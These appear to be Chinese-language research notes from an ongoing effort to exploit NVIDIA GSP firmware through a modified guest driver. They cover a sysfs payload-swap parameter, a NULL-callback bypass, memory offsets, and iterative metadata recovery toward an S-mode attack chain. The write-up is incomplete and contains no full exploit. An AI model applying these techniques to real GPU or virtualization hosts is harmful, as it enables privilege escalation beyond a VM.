# ═══════════════════════════════════════════════════════════════

## Z.1 v24.1 驱动(已构建安装于VM dkms)
```
改动: nv.c:158 char nvidia_xdig_map[4096]; (去static!extern要链接)
      nv.c:169 module_param_string(xdig_map, nvidia_xdig_map, 4096, 0644);
      message_queue_cpu.c:497 extern char nvidia_xdig_map[];
效果: /sys/module/nvidia/parameters/xdig_map 运行时可写(root), 下次RPC重parse
⚠️ 教训: charp指针型参数运行时写=UAF(把VM内核搞oops过一次)! 必须数组型!
dkms构建法: rm -rf /var/lib/dkms/nvidia/610.57.04/$(uname -r) 后 dkms build
      (dkms"already built"会骗人), 产物手动cp到updates/dkms+depmod
```

## Z.2 关键机制发现
```
1. host重试RPC是fn=10(FREE), 不匹配fn=76点火条件 → 换弹后需再跑nvidia-smi
   产生新fn=76 → 但RPC#1超时后RmInitAdapter失败, smi#2发不出RPC → 
   运行时换弹仅在"RPC#1成功"后有意义!
2. ★ NULL回调旁路: _backendRead32: if(fcnBackendRw!=NULL){...} else
   { *pVal = *(volatile NvU32*)pAddr; } → B8=NULL(MAP 0x100b8:0) = 
   泵直接volatile读 = 队列原生工作 = 无需忠实后端gadget(搜过不存在)!
3. 泵侧多次调用(Call#1写回调槽自换, Call#2=新gadget)与host侧换弹互补。
```

## Z.3 metadata恢复迭代(进行中)
```
ITER1 (rxLinked+NULL回调+5指针簇CD0-CF0): 无崩溃! 泵存活! 空闲卡死
  → 诊断: rx.msgCount(+0x88)=0 → writePtr>=0 → 恒"无消息"
ITER2 (+tx/rx头: size=0x40000 msgSize=0x1000 msgCount=0x3f txLinked=1):
  仍空闲无崩溃 — 位置槽语义或流程更早处有门未过
宿主META DUMP字段对照(重要!):
  META[050]={version=0,size=0x40000} META[058]={msgSize=0x1000,msgCount=0x3f}
  (来自宿主232B镜像, 与GSP侧+0x50/+0x58对应关系待精确验证)
下一步(下次会话):
  1. 读原语读 [0x0FE4790CE0](pWriteIncoming位置槽)和[0x0FE4790CD0](entries起点)
     真实值 → 验证指针簇语义 → 补对字段
  2. 每轮迭代崩哪补哪(sepc=字段路标)直到RPC成功(Xid119消失)
  3. RPC成功后: sysfs换弹 → fire#2=完整攻击链 → S-MODE
```

## Z.4 今日四连突破总结
1. ★MULTI-CALL实锤(自换回调双发, sepc=0x01AA181C精确历史指纹)
2. ★v24.1运行时换弹驱动(数组型参数, UAF教训)
3. ★NULL回调旁路(泵原生工作, 绕过不存在的忠实后端gadget)
4. ★metadata迭代法落地(两轮: 均无崩溃存活, 字段逐个收敛)
距S-mode: metadata恢复收敛(几轮)→ RPC成功 → 换弹fire#2 → 攻击链 → jalr dtor
